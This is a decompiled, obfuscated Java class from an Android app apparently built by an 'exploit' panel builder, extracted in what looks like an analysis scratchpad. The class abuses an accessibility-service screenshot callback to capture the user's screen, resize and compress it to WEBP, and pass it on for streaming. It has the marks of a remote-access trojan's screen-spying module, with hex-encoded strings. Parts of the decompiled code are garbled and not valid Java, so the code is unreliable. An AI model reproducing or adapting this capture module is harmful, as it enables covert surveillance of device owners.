package v.s;

import android.accessibilityservice.AccessibilityService;
import android.graphics.Bitmap;
import android.hardware.HardwareBuffer;
import android.os.Build;
import app.mobilex.plus.services.DataQFAdapter;
import app.mobilex.plus.util.TypefaceCache;
import java.io.ByteArrayOutputStream;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class WbI2W97lldWeFi5i54 implements AccessibilityService.TakeScreenshotCallback {
    public final /* synthetic */ deLJ4Z0aL3hcJ3O1 dDIMxZXP1V8HdM;
    public final /* synthetic */ DataQFAdapter w9sT1Swbhx3hs;

    public WbI2W97lldWeFi5i54(DataQFAdapter dataQFAdapter, deLJ4Z0aL3hcJ3O1 delj4z0al3hcj3o1) {
        this.dDIMxZXP1V8HdM = delj4z0al3hcj3o1;
        this.w9sT1Swbhx3hs = dataQFAdapter;
    }

    @Override // android.accessibilityservice.AccessibilityService.TakeScreenshotCallback
    public final void onFailure(int i) {
        if (i == 1) {
            TypefaceCache.checked("000A0058006F00A200C2009100F3008B001C0053006900B500DF008D009200EF04710428040C04DB04AE04E9048F04F90063042B040E04A500B0049F048204F004030423047304D204AD04E704FD00EE");
        } else {
            String strObtain = TypefaceCache.obtain("001600780050008900FF00A800DC00E7002600640049008800E200FF009A");
            StringBuilder sb = new StringBuilder();
            sb.append(strObtain);
            sb.append(i);
            sb.append(")");
        }
        String unused = DataQFAdapter.TAG;
        TypefaceCache.obtain("003700770050008200C300BC00C000A2002600780048008F00FF00AB009200810002005F007700A200D400E50092");
        deLJ4Z0aL3hcJ3O1 delj4z0al3hcj3o1 = this.dDIMxZXP1V8HdM;
        if (delj4z0al3hcj3o1 != null) {
            delj4z0al3hcj3o1.pyu8ovAipBTLYAiKab(null);
        }
    }

    /* JADX WARN: Code duplicated, block: B:131:0x01a1 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:134:0x01a6 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:136:0x01ab A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:138:0x016f A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:142:0x0174 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:146:0x0179 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:170:? A[RETURN, SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:171:? A[RETURN, SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:81:0x0161 A[Catch: all -> 0x0165, TRY_LEAVE, TryCatch #2 {all -> 0x0165, blocks: (B:79:0x0152, B:81:0x0161, B:95:0x0188, B:97:0x019c), top: B:133:0x000a }] */
    /* JADX WARN: Code duplicated, block: B:97:0x019c A[Catch: all -> 0x0165, TRY_LEAVE, TryCatch #2 {all -> 0x0165, blocks: (B:79:0x0152, B:81:0x0161, B:95:0x0188, B:97:0x019c), top: B:133:0x000a }] */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Not initialized variable reg: 3, insn: 0x0166: MOVE (r0 I:??[OBJECT, ARRAY]) = (r3 I:??[OBJECT, ARRAY]) (LINE:318), block:B:84:0x0166 */
    /* JADX WARN: Not initialized variable reg: 4, insn: 0x016a: MOVE (r0 I:??[OBJECT, ARRAY]) = (r4 I:??[OBJECT, ARRAY]) (LINE:321), block:B:84:0x0166 */
    /* JADX WARN: Type inference failed for: r10v0, types: [android.accessibilityservice.AccessibilityService$ScreenshotResult] */
    /* JADX WARN: Type inference failed for: r10v1 */
    /* JADX WARN: Type inference failed for: r10v10 */
    /* JADX WARN: Type inference failed for: r10v11 */
    /* JADX WARN: Type inference failed for: r10v13, types: [android.graphics.Bitmap] */
    /* JADX WARN: Type inference failed for: r10v14 */
    /* JADX WARN: Type inference failed for: r10v15 */
    /* JADX WARN: Type inference failed for: r10v16 */
    /* JADX WARN: Type inference failed for: r10v17 */
    /* JADX WARN: Type inference failed for: r10v18 */
    /* JADX WARN: Type inference failed for: r10v19 */
    /* JADX WARN: Type inference failed for: r10v2 */
    /* JADX WARN: Type inference failed for: r10v20 */
    /* JADX WARN: Type inference failed for: r10v21 */
    /* JADX WARN: Type inference failed for: r10v3 */
    /* JADX WARN: Type inference failed for: r10v4 */
    /* JADX WARN: Type inference failed for: r10v5 */
    /* JADX WARN: Type inference failed for: r10v6, types: [android.graphics.Bitmap] */
    /* JADX WARN: Type inference failed for: r10v7, types: [android.graphics.Bitmap] */
    /* JADX WARN: Type inference failed for: r10v8, types: [android.graphics.Bitmap] */
    /* JADX WARN: Type inference failed for: r10v9 */
    @Override // android.accessibilityservice.AccessibilityService.TakeScreenshotCallback
    public final void onSuccess(AccessibilityService.ScreenshotResult screenshotResult) throws Throwable {
        HardwareBuffer hardwareBuffer;
        Throwable th;
        Bitmap bitmapCopy;
        ?? r10;
        Bitmap bitmap;
        ?? r11;
        Bitmap bitmap2;
        Bitmap bitmap3;
        Bitmap bitmap4;
        Bitmap bitmap5;
        Bitmap bitmap6;
        ?? r12;
        deLJ4Z0aL3hcJ3O1 delj4z0al3hcj3o1;
        ?? r13;
        deLJ4Z0aL3hcJ3O1 delj4z0al3hcj3o2;
        int i;
        String unused = DataQFAdapter.TAG;
        TypefaceCache.obtain("003700770050008200C300BC00C000A2002600780048008F00FF00AB0092009400160055007800A200C3008C0093");
        Bitmap bitmap7 = null;
        try {
            try {
                hardwareBuffer = screenshotResult.getHardwareBuffer();
                try {
                    screenshotResult = Bitmap.wrapHardwareBuffer(hardwareBuffer, screenshotResult.getColorSpace());
                    try {
                        if (screenshotResult == 0) {
                            String unused2 = DataQFAdapter.TAG;
                            TypefaceCache.obtain("00340064005A009700D800BE00C000A3003400770049008200D200AA00D400A100260064001B009500F500AB00C700B5002D0073005F00C700FE00AA00DE00AB");
                            deLJ4Z0aL3hcJ3O1 delj4z0al3hcj3o3 = this.dDIMxZXP1V8HdM;
                            if (delj4z0al3hcj3o3 != null) {
                                delj4z0al3hcj3o3.pyu8ovAipBTLYAiKab(null);
                            }
                            hardwareBuffer.close();
                            try {
                                hardwareBuffer.close();
                                return;
                            } catch (Throwable unused3) {
                                return;
                            }
                        }
                        bitmapCopy = screenshotResult.copy(Bitmap.Config.ARGB_8888, false);
                        try {
                            DataQFAdapter.Companion.getClass();
                            int i2 = DataQFAdapter.streamWidth;
                            int i3 = QmLUFJ3vXstIdpO2wk.dDIMxZXP1V8HdM;
                            int iJ0zjQ7CAgohuxU20eCW6 = Y9mRyRdkl5FOcwb66V6.J0zjQ7CAgohuxU20eCW6(QmLUFJ3vXstIdpO2wk.dDIMxZXP1V8HdM);
                            if (iJ0zjQ7CAgohuxU20eCW6 == 0) {
                                i = 720;
                            } else if (iJ0zjQ7CAgohuxU20eCW6 == 1) {
                                i = 480;
                            } else {
                                if (iJ0zjQ7CAgohuxU20eCW6 != 2) {
                                    throw new Sb7Xj3N9U1DQ();
                                }
                                i = 280;
                            }
                            if (i2 > i) {
                                i2 = i;
                            }
                            Bitmap bitmapCreateScaledBitmap = Bitmap.createScaledBitmap(bitmapCopy, i2, (int) ((bitmapCopy.getHeight() / bitmapCopy.getWidth()) * i2), true);
                            try {
                                String str = vbdyByOHPJmeGXlq.dDIMxZXP1V8HdM;
                                if (vbdyByOHPJmeGXlq.D5P1xCAyuvgF && QmLUFJ3vXstIdpO2wk.dDIMxZXP1V8HdM != 3) {
                                    bitmapCreateScaledBitmap = this.w9sT1Swbhx3hs.enhanceContrast(bitmapCreateScaledBitmap);
                                }
                                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream((DataQFAdapter.streamWidth * DataQFAdapter.streamWidth) / 4);
                                int iXDyLpEZyrcKVe0 = vbdyByOHPJmeGXlq.D5P1xCAyuvgF ? 70 : OFtLBiBbrrTHWu.xDyLpEZyrcKVe0(DataQFAdapter.streamQuality, 10, 100);
                                if (Build.VERSION.SDK_INT >= 30) {
                                    bitmapCreateScaledBitmap.compress(Bitmap.CompressFormat.WEBP_LOSSY, iXDyLpEZyrcKVe0, byteArrayOutputStream);
                                } else {
                                    bitmapCreateScaledBitmap.compress(Bitmap.CompressFormat.WEBP, iXDyLpEZyrcKVe0, byteArrayOutputStream);
                                }
                                byte[] byteArray = byteArrayOutputStream.toByteArray();
                                byteArrayOutputStream.close();
                                deLJ4Z0aL3hcJ3O1 delj4z0al3hcj3o4 = this.dDIMxZXP1V8HdM;
                                if (delj4z0al3hcj3o4 != null) {
                                    delj4z0al3hcj3o4.pyu8ovAipBTLYAiKab(byteArray);
                                }
                                if (bitmapCreateScaledBitmap != null) {
                                    try {
                                        bitmapCreateScaledBitmap.recycle();
                                    } catch (Throwable unused4) {
                                    }
                                }
                                try {
                                    bitmapCopy.recycle();
                                } catch (Throwable unused5) {
                                }
                                try {
                                    screenshotResult.recycle();
                                } catch (Throwable unused6) {
                                }
                                if (hardwareBuffer == null) {
                                    return;
                                }
                            } catch (Exception e) {
                                Bitmap bitmap8 = bitmapCreateScaledBitmap;
                                bitmap2 = bitmapCopy;
                                e = e;
                                bitmap6 = bitmap8;
                                r13 = screenshotResult;
                                String unused7 = DataQFAdapter.TAG;
                                TypefaceCache.obtain("001000750049008200F500B100C100AF002C0062001B009700E200B000D100A200300065001B008200E200AD00DD00B500790036");
                                e.getMessage();
                                delj4z0al3hcj3o2 = this.dDIMxZXP1V8HdM;
                                if (delj4z0al3hcj3o2 != null) {
                                    delj4z0al3hcj3o2.pyu8ovAipBTLYAiKab(null);
                                }
                                if (bitmap6 != null) {
                                    try {
                                        bitmap6.recycle();
                                    } catch (Throwable unused8) {
                                    }
                                }
                                if (bitmap2 != null) {
                                    try {
                                        bitmap2.recycle();
                                    } catch (Throwable unused9) {
                                    }
                                }
                                if (r13 != 0) {
                                    try {
                                        r13.recycle();
                                    } catch (Throwable unused10) {
                                    }
                                }
                                if (hardwareBuffer == null) {
                                    return;
                                }
                            } catch (OutOfMemoryError e2) {
                                Bitmap bitmap9 = bitmapCreateScaledBitmap;
                                bitmap = bitmapCopy;
                                e = e2;
                                bitmap5 = bitmap9;
                                r12 = screenshotResult;
                                String unused11 = DataQFAdapter.TAG;
                                TypefaceCache.obtain("000C0059007600C700F900B1009200B400200064005E008200FE00AC00DA00A80037002C001B");
                                e.getMessage();
                                System.gc();
                                delj4z0al3hcj3o1 = this.dDIMxZXP1V8HdM;
                                if (delj4z0al3hcj3o1 != null) {
                                    delj4z0al3hcj3o1.pyu8ovAipBTLYAiKab(null);
                                }
                                if (bitmap5 != null) {
                                    try {
                                        bitmap5.recycle();
                                    } catch (Throwable unused12) {
                                    }
                                }
                                if (bitmap != null) {
                                    try {
                                        bitmap.recycle();
                                    } catch (Throwable unused13) {
                                    }
                                }
                                if (r12 != 0) {
                                    try {
                                        r12.recycle();
                                    } catch (Throwable unused14) {
                                    }
                                }
                                if (hardwareBuffer == null) {
                                    return;
                                }
                            } catch (Throwable th2) {
                                Bitmap bitmap10 = bitmapCreateScaledBitmap;
                                th = th2;
                                bitmap7 = bitmap10;
                                if (bitmap7 != null) {
                                    try {
                                        bitmap7.recycle();
                                    } catch (Throwable unused15) {
                                    }
                                }
                                if (bitmapCopy != null) {
                                    try {
                                        bitmapCopy.recycle();
                                    } catch (Throwable unused16) {
                                    }
                                }
                                if (screenshotResult != 0) {
                                    try {
                                        screenshotResult.recycle();
                                    } catch (Throwable unused17) {
                                    }
                                }
                                if (hardwareBuffer == null) {
                                    throw th;
                                }
                                try {
                                    hardwareBuffer.close();
                                    throw th;
                                } catch (Throwable unused18) {
                                    throw th;
                                }
                            }
                        } catch (Exception e3) {
                            bitmap2 = bitmapCopy;
                            e = e3;
                            bitmap6 = null;
                            r13 = screenshotResult;
                        } catch (OutOfMemoryError e4) {
                            bitmap = bitmapCopy;
                            e = e4;
                            bitmap5 = null;
                            r12 = screenshotResult;
                        } catch (Throwable th3) {
                            th = th3;
                        }
                        try {
                            hardwareBuffer.close();
                        } catch (Throwable unused19) {
                        }
                    } catch (Exception e5) {
                        e = e5;
                        bitmap2 = null;
                        r11 = screenshotResult;
                        bitmap6 = bitmap2;
                        r13 = r11;
                        String unused20 = DataQFAdapter.TAG;
                        TypefaceCache.obtain("001000750049008200F500B100C100AF002C0062001B009700E200B000D100A200300065001B008200E200AD00DD00B500790036");
                        e.getMessage();
                        delj4z0al3hcj3o2 = this.dDIMxZXP1V8HdM;
                        if (delj4z0al3hcj3o2 != null) {
                            delj4z0al3hcj3o2.pyu8ovAipBTLYAiKab(null);
                        }
                        if (bitmap6 != null) {
                            bitmap6.recycle();
                        }
                        if (bitmap2 != null) {
                            bitmap2.recycle();
                        }
                        if (r13 != 0) {
                            r13.recycle();
                        }
                        if (hardwareBuffer == null) {
                            return;
                        }
                        hardwareBuffer.close();
                    } catch (OutOfMemoryError e6) {
                        e = e6;
                        bitmap = null;
                        r10 = screenshotResult;
                        bitmap5 = bitmap;
                        r12 = r10;
                        String unused110 = DataQFAdapter.TAG;
                        TypefaceCache.obtain("000C0059007600C700F900B1009200B400200064005E008200FE00AC00DA00A80037002C001B");
                        e.getMessage();
                        System.gc();
                        delj4z0al3hcj3o1 = this.dDIMxZXP1V8HdM;
                        if (delj4z0al3hcj3o1 != null) {
                            delj4z0al3hcj3o1.pyu8ovAipBTLYAiKab(null);
                        }
                        if (bitmap5 != null) {
                            bitmap5.recycle();
                        }
                        if (bitmap != null) {
                            bitmap.recycle();
                        }
                        if (r12 != 0) {
                            r12.recycle();
                        }
                        if (hardwareBuffer == null) {
                            return;
                        }
                        hardwareBuffer.close();
                    } catch (Throwable th4) {
                        th = th4;
                        bitmapCopy = null;
                    }
                } catch (Exception e7) {
                    e = e7;
                    r11 = 0;
                    bitmap2 = null;
                } catch (OutOfMemoryError e8) {
                    e = e8;
                    r10 = 0;
                    bitmap = null;
                } catch (Throwable th5) {
                    screenshotResult = 0;
                    th = th5;
                    bitmapCopy = null;
                }
            } catch (Throwable th6) {
                th = th6;
                bitmapCopy = bitmap3;
                bitmap7 = bitmap4;
            }
        } catch (Exception e9) {
            e = e9;
            r11 = 0;
            hardwareBuffer = null;
            bitmap2 = null;
        } catch (OutOfMemoryError e10) {
            e = e10;
            r10 = 0;
            hardwareBuffer = null;
            bitmap = null;
        } catch (Throwable th7) {
            screenshotResult = 0;
            hardwareBuffer = null;
            th = th7;
            bitmapCopy = null;
        }
    }
}
